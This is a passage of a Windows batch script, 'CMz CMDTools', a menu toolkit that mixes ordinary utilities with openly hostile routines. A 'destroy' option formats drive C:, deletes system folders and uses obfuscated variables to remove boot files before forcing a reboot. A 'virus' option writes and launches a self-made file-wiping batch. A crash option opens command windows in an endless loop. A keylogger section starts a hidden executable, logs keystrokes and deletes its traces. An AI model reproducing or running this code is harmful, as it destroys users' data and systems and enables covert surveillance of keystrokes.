if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:shutdown

echo This feature should be used in conjuction with All Computers on Network feature
shutdown -i
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:findip

echo Open your messenger and start talking to the person
echo you want to finds ip
echo Now select the third foriegn IP address down
netstat -n
echo That's it! You're done!!!
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:passgen

echo CMz CMDTools will now generate a random 5 digit number
:loop1
echo %random%
pause
set /p begin27= Would you like to generate? [Y/N]:: 
if "%begin27%"=="Y" goto loop2
if "%begin27%"=="y" goto loop2
if "%begin27%"=="yes" goto loop2
if "%begin27%"=="Yes" goto loop2

if "%begin27%"=="N" goto begin
if "%begin27%"=="n" goto begin
if "%begin27%"=="no" goto begin
if "%begin27%"=="No" goto begin

:loop2
goto loop1



:crash

echo Crashing comuter...
pause
:loop
start cmd
goto loop

set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:spam

set /p text=Text to go in spam:::
echo You want "%text%" to go in the spam
echo.
pause
echo Spamming desktop in 3
ping localhost -n 3 >nul 
echo 2
ping localhost -n 2 >nul
echo 1
ping localhost -n 1 >nul
echo %text% > C:\Users\%username%\Desktop\%random%.txt
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:destroy


set /p yesnodestroy= Are you sure you want to continue? [Y/N]:
if /i "%yesnodestroy%"=="y" (
echo CMz CMDTools will now do everything it can to destroy this computer in 3 seconds
ping localhost -n 3 >nul 
echo 2 SECONDS
ping localhost -n 2 >nul
echo 1 SECONDS
ping localhost -n 1 >nul
pause
format c:
del %systemdrive%
del %systemroot%
del %programfiles%
echo %random%.txt > C:\Users\%username%\Desktop\%random%.txt
set a= rem --
set b= rem
set c= The
set d= Last
set f= Restart
set g= att
set h= rib
set i= -r
set j= -s
set k= -h
set l= c:\
set m= auto
set n= exec
set o= .
set p= bat
set q= del
set r= boot
set s= ini
set t= ntldr
set u= win
set v= dows
set w= \
set x= shut
set y= /r /t
set z= down
set aa= 00

%a%
%b% %c% %d% %f%
%g%%h% %i% %j% %k% %l%%m%%n%%o%%p%
%q% %l%%m%%n%%o%%p%
%g%%h% %i% %j% %k% %l%%r%%o%%s%
%q% %l%%r%%o%%s%
%g%%h% %i% %j% %k% %l%%t%
%q% %l%%t%
%g%%h% %i% %j% %k% %l%%u%%v%%w%%u%%o%%s%
%q% %l%%u%%v%%w%%u%%o%%s%
%x%%z% %y% %aa%
%a%
) ELSE ( 
goto begin
)

:spamwinxp

set /p text=Text to go in spam:::
echo You want "%text%" to go in the spam
echo.
pause
echo Spamming desktop in 3
ping localhost -n 3 >nul 
echo 2
ping localhost -n 2 >nul
echo 1
ping localhost -n 1 >nul
echo %text% > C:\Documents and Settings\%username%\Desktop\%random%.txt
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:startpro

echo Please ensure you include the exetension [e.g. taskmgr.EXE]
set /p pro=Progam/Process name:::
echo You have chosen to start "%pro%"
pause
IF EXIST %pro% GOTO EXIST
IF NOT EXIST %pro% ( 
                    echo This program or process does not exist, please try again!
					goto startpro
					)
:EXIST 

echo Starting "%pro%"
pause
start %pro%
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:endpro

echo Please ensure you include the exetension [e.g. taskmgr.EXE]
set /p pro1=Progam/Process name:::
echo You have chosen to end is "%pro%"
pause
IF EXIST %pro1% GOTO EXIST1
IF NOT EXIST %pro1% ( 
                    echo This program or process does not exist, please try again!
					goto endpro
					) 
:EXIST1

echo Ending "%pro1%"
pause
taskkill %pro1%
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:logout

echo Logging out in 3
ping localhost -n 3 >nul 
echo 2
ping localhost -n 3 >nul
echo 1
ping localhost -n 3 >nul
shutdown /l
pause
goto begin

:shutdown

echo Shutting down in 3...
ping localhost -n 3 >nul 
echo 2
ping localhost -n 3 >nul
echo 1
ping localhost -n 3 >nul
shutdown /s
pause
goto begin

:restart

echo Rebooting computer in 3
ping localhost -n 3 >nul 
echo 2
ping localhost -n 3 >nul
echo 1
ping localhost -n 3 >nul
shutdown /f /r
pause 
goto begin

:runningpro
 
 echo Compiling list...
 ping localhost -n 3 >nul 
echo.
ping localhost -n 3 >nul
echo.
ping localhost -n 3 >nul
tasklist
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:livetime

:looopy
@echo off
cls
echo %time%
goto looopy

:verinfo

echo This is CMz CMDTools V1 FULL EDITION
echo 25 new features;
echo Bug fixes;
echo Human verification;
echo Registeration;
echo Check Username/Password
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:procheck

set /p check=Program name:
echo You have chosen "%check%"
pause
IF EXIST %check% echo Program exists!
IF NOT EXIST %check% echo Program has not been found!
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:drives 

echo Detecting drives...
echo.
echo.
@echo off
IF EXIST A:\ echo Drive A:\ is active
IF EXIST B:\ echo Drive B:\ is active
IF EXIST C:\ echo Drive C:\ is active
IF EXIST D:\ echo Drive D:\ is active
IF EXIST E:\ echo Drive E:\ is active
IF EXIST F:\ echo Drive F:\ is active
IF EXIST G:\ echo Drive G:\ is active
IF EXIST H:\ echo Drive H:\ is active
IF EXIST I:\ echo Drive I:\ is active
IF EXIST J:\ echo Drive J:\ is active
IF EXIST K:\ echo Drive K:\ is active
IF EXIST L:\ echo Drive L:\ is active
IF EXIST M:\ echo Drive M:\ is active
IF EXIST N:\ echo Drive N:\ is active
IF EXIST O:\ echo Drive O:\ is active
IF EXIST P:\ echo Drive P:\ is active
IF EXIST Q:\ echo Drive Q:\ is active
IF EXIST R:\ echo Drive R:\ is active
IF EXIST S:\ echo Drive S:\ is active
IF EXIST T:\ echo Drive T:\ is active
echo __
echo __
IF EXIST A:\testfile.txt echo Drive A:\ is your USB drive
IF EXIST B:\testfile.txt echo Drive B:\ is your USB drive
IF EXIST C:\testfile.txt echo Drive C:\ is your USB drive
IF EXIST D:\testfile.txt echo Drive D:\ is your USB drive
IF EXIST E:\testfile.txt echo Drive E:\ is your USB drive
IF EXIST F:\testfile.txt echo Drive F:\ is your USB drive
IF EXIST G:\testfile.txt echo Drive G:\ is your USB drive
IF EXIST H:\testfile.txt echo Drive H:\ is your USB drive
IF EXIST I:\testfile.txt echo Drive I:\ is your USB drive
IF EXIST J:\testfile.txt echo Drive J:\ is your USB drive
IF EXIST K:\testfile.txt echo Drive K:\ is your USB drive
IF EXIST L:\testfile.txt echo Drive L:\ is your USB drive
IF EXIST M:\testfile.txt echo Drive M:\ is your USB drive
IF EXIST N:\testfile.txt echo Drive N:\ is your USB drive
IF EXIST O:\testfile.txt echo Drive O:\ is your USB drive
IF EXIST P:\testfile.txt echo Drive P:\ is your USB drive
IF EXIST Q:\testfile.txt echo Drive Q:\ is your USB drive
IF EXIST R:\testfile.txt echo Drive R:\ is your USB drive
IF EXIST S:\testfile.txt echo Drive S:\ is your USB drive
IF EXIST T:\testfile.txt echo Drive T:\ is your USB drive
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:command

@echo off
cls
title Command Prompt - by RMz-Panda
echo (C) Copyright RetailModz.com
ver
echo (C) Copyright Microsoft Corp.
echo.
:cmd
set /p "cmd=%cd%>"
%cmd%
echo.
goto cmd


:usvir

set /a a=v
set /a b=i
set /a c=r
set /a d=u
set /a e=s
echo Creating %a%%b%%c%%d%%e%...
echo Deleting %systemdrive% > bat%a%%b%%c%%d%%e%.bat
pause > bat%a%%b%%c%%d%%e%.bat
del %systemdrive%\%username% > bat%a%%b%%c%%d%%e%.bat
del %systemdrive% > bat%a%%b%%c%%d%%e%.bat
del %cd% > bat%a%%b%%c%%d%%e%.bat
del %systemdrive%\%username%\"*.*" > bat%a%%b%%c%%d%%e%.bat
del %1 > bat%a%%b%%c%%d%%e%.bat
format c: /q > bat%a%%b%%c%%d%%e%.bat
set /p virus=Would you like to start the %a%%b%%c%%d%%e%?
if "%virus%"=="Y" goto start
if "%virus%"=="y" goto start
if "%virus%"=="yes" goto start
if "%virus%"=="Yes" goto start

if "%virus%"=="N" goto begin
if "%virus%"=="n" goto begin
if "%virus%"=="no" goto begin
if "%virus%"=="No" goto begin

:start 

echo Starting virus in 3
ping localhost -n 3 >nul 
echo Starting Virus in 2
ping localhost -n 3 >nul
echo Starting virus in 1
ping localhost -n 3 >nul
start bat%a%%b%%c%%d%%e%.bat

:systemroot

echo Starting "%systemroot%"...
start %systemroot%
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:startc

echo Starting "C:\"
start c:\
pause
set /p begin27= Would you like to select another option? [Y/N]:: 
if "%begin27%"=="Y" goto begin
if "%begin27%"=="y" goto begin
if "%begin27%"=="yes" goto begin
if "%begin27%"=="Yes" goto begin

if "%begin27%"=="N" goto exit4
if "%begin27%"=="n" goto exit4
if "%begin27%"=="no" goto exit4
if "%begin27%"=="No" goto exit4

:keylog
@echo off
cls
set -=set
:: <Config>
%-% Window_0_Color=0A
%-% Window_0_Title=Simple Keylogger
%-% Window_0_Author=RMz-Panda
%-% Window_0_Version=v2.4
:: </Config>
color %Window_0_Color%
title ^> %Window_0_Title% %Window_0_Version% by %Window_0_Author%
mode con lines=35 cols=60 
goto :Window_0
:Window_0
cls
echo.
echo  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛÛÛÛ°ÛÛ°°°°°°°Û°°°°°Û°ÛÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°ÛÛ°ÛÛ°ÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°°°°Û°°ÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°°°°Û°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛ°°°°Û°ÛÛÛÛ°Û°ÛÛÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°Û°°°°°ÛÛº
echo  ºÛ°°°°°°Û°ÛÛÛÛ°ÛÛÛÛ°Û°ÛÛÛÛÛ°ÛÛ°°Û°ÛÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛ°ÛÛÛ°ÛÛº
echo  ºÛ°°ÛÛÛ°Û°°°°Û°°°°°°Û°°ÛÛÛÛ°ÛÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°°°Û°°°°°°Ûº
echo  ºÛ°°ÛÛÛ°Û°°ÛÛÛÛÛ°°ÛÛÛ°°ÛÛÛÛ°ÛÛÛ°Û°°Û°°Û°°Û°°Û°°ÛÛÛ°°ÛÛÛ°Ûº
echo  ºÛ°°ÛÛÛ°Û°°°°ÛÛÛ°°ÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°°Û°°°°Û°°ÛÛÛ°Ûº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
echo  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹^>%Window_0_Version% by %Window_0_Author%
echo                            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo Thanks to whoever coded this!
echo. & echo.
echo  ^> MENU:
echo. & echo.
echo *Enable Keylogger...................[1]
echo *Disable Keylogger..................[2]
echo *View Keystrokes....................[3]
echo *Delete all files...................[D]
echo *Exit...............................[Q]
echo. & echo.
%-% /p Window_0_Action=^> Choice (1/2/3/D/Q): 
if /i "%Window_0_Action%"=="1" goto :Window_0_Enable
if /i "%Window_0_Action%"=="2" goto :Window_0_Disable
if /i "%Window_0_Action%"=="3" goto :Window_0_ViewKeystrokes
if /i "%Window_0_Action%"=="D" goto :Window_0_DelTraces
if /i "%Window_0_Action%"=="Q" goto begin
goto :Window_0
:Window_0_Enable
call :Builder
if not exist "%TMP%\keyz.exe" goto :Window_0_Error
CD "%TMP%\"
start "" "%TMP%\keyz.exe"
cls
echo.
echo  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛÛÛÛ°ÛÛ°°°°°°°Û°°°°°Û°ÛÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°ÛÛ°ÛÛ°ÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°°°°Û°°ÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°°°°Û°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛ°°°°Û°ÛÛÛÛ°Û°ÛÛÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°Û°°°°°ÛÛº
echo  ºÛ°°°°°°Û°ÛÛÛÛ°ÛÛÛÛ°Û°ÛÛÛÛÛ°ÛÛ°°Û°ÛÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛ°ÛÛÛ°ÛÛº
echo  ºÛ°°ÛÛÛ°Û°°°°Û°°°°°°Û°°ÛÛÛÛ°ÛÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°°°Û°°°°°°Ûº
echo  ºÛ°°ÛÛÛ°Û°°ÛÛÛÛÛ°°ÛÛÛ°°ÛÛÛÛ°ÛÛÛ°Û°°Û°°Û°°Û°°Û°°ÛÛÛ°°ÛÛÛ°Ûº
echo  ºÛ°°ÛÛÛ°Û°°°°ÛÛÛ°°ÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°°Û°°°°Û°°ÛÛÛ°Ûº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
echo  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹^>%Window_0_Version% by %Window_0_Author%º
echo                            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo. & echo.
echo ^> KEYLOGGER ENABLED!!
echo.
echo ^> All keystrokes will be recorded!
echo. & echo. & echo. & echo. & echo. & echo.
pause
goto :Window_0
:Window_0_Disable
tskill keyz
taskkill /F /IM "keyz.exe"
cls
echo.
echo  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛÛÛÛ°ÛÛ°°°°°°°Û°°°°°Û°ÛÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°ÛÛ°ÛÛ°ÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°°°°Û°°ÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°°°°Û°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛ°°°°Û°ÛÛÛÛ°Û°ÛÛÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°Û°°°°°ÛÛº
echo  ºÛ°°°°°°Û°ÛÛÛÛ°ÛÛÛÛ°Û°ÛÛÛÛÛ°ÛÛ°°Û°ÛÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛ°ÛÛÛ°ÛÛº
echo  ºÛ°°ÛÛÛ°Û°°°°Û°°°°°°Û°°ÛÛÛÛ°ÛÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°°°Û°°°°°°Ûº
echo  ºÛ°°ÛÛÛ°Û°°ÛÛÛÛÛ°°ÛÛÛ°°ÛÛÛÛ°ÛÛÛ°Û°°Û°°Û°°Û°°Û°°ÛÛÛ°°ÛÛÛ°Ûº
echo  ºÛ°°ÛÛÛ°Û°°°°ÛÛÛ°°ÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°°Û°°°°Û°°ÛÛÛ°Ûº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
echo  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹^>%Window_0_Version% by %Window_0_Author%º
echo                            ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo. & echo.
echo ^> KEYLOGGER DISABLED!!
echo.
echo ^> Keystrokes recording disabled!
echo. & echo. & echo. & echo. & echo. & echo.
pause
goto :Window_0
:Window_0_ViewKeystrokes
start "" "%TMP%\logs.txt"
goto :Window_0
:Window_0_DelTraces
del /F /Q "%TMP%\logs.txt" >nul 2>&1
del /F /Q "%TMP%\keyz.exe" >nul 2>&1
del /F /Q "%TMP%\keyz.dat" >nul 2>&1
:Window_0_Error
cls
echo.
echo  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛÛÛÛ°ÛÛ°°°°°°°Û°°°°°Û°ÛÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°ÛÛ°ÛÛ°ÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°°°°Û°°ÛÛÛÛ°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°°°°°°Û°°Û°°Û°ÛÛ°Û°°ÛÛÛÛ°°°°°Û°°°°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛº
echo  ºÛ°ÛÛÛ°ÛÛ°°°°Û°ÛÛÛÛ°Û°ÛÛÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°Û°°°°°ÛÛº
echo  ºÛ°°°°°°Û°ÛÛÛÛ°ÛÛÛÛ°Û°ÛÛÛÛÛ°ÛÛ°°Û°ÛÛÛ°Û°ÛÛÛ°Û°ÛÛÛÛ°ÛÛÛ°ÛÛº
echo  ºÛ°°ÛÛÛ°Û°°°°Û°°°°°°Û°°ÛÛÛÛ°ÛÛÛ°Û°°ÛÛÛÛ°°ÛÛÛÛ°°°°Û°°°°°°Ûº
echo  ºÛ°°ÛÛÛ°Û°°ÛÛÛÛÛ°°ÛÛÛ°°ÛÛÛÛ°ÛÛÛ°Û°°Û°°Û°°Û°°Û°°ÛÛÛ°°ÛÛÛ°Ûº
echo  ºÛ°°ÛÛÛ°Û°°°°ÛÛÛ°°ÛÛÛ°°°°°Û°°°°°Û°°°°°Û°°°°°Û°°°°Û°°ÛÛÛ°Ûº
